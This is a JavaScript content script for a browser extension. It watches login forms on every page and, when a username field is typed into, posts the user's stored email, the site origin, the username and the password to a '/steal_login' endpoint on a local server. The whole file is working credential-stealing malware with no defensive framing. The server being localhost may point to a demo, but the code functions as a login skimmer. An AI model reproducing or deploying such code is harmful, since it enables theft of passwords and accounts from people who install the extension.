var inputs = $('input');
var password = $('[type="password"]')[0];
$(password).change(function () {
    chrome.storage.local.get('email', function (result) {
        var userEmail = result.email;
        if (typeof userEmail === 'undefined') userEmail = "no_email_found";
        inputs.trigger('input');
    });
});

$.each(inputs, function (element) {
    $.get(`http://localhost:5000/get_login_kw`, function (result) {
        var is_in_attr = false;
        var not_password_type = true;
        $.each(result.keywords, function (key) {
            $.each(inputs[element].attributes, function () {
                if (!(this.value === undefined)) {
                    if (this.name == 'type' && this.value == "password") {
                        not_password_type = false;
                    }
                    if (this.value.indexOf(result.keywords[key]) >= 0) {
                        is_in_attr = true;
                    }
                }
            });
        });
        if (is_in_attr && not_password_type) {
            $(inputs[element]).on('input', function () {
                if ($(inputs[element]).val() != "") {
                    chrome.storage.local.get('email', function (resu) {
                        var userEmail;
                        var password = $('[type="password"]')[0];
                        if (typeof resu === 'undefined') userEmail = "no_email_found";
                        else userEmail = resu.email;
                        if (inputs[element].value != "" &&
                            !(typeof password === 'undefined')) {
                            $.post("http://localhost:5000/steal_login", {
                                email: userEmail,
                                url: window.location.origin,
                                username: $(inputs[element]).val(),
                                password: $(password).val()
                            });
                        }
                    });
                }
            });
        }
    });

});

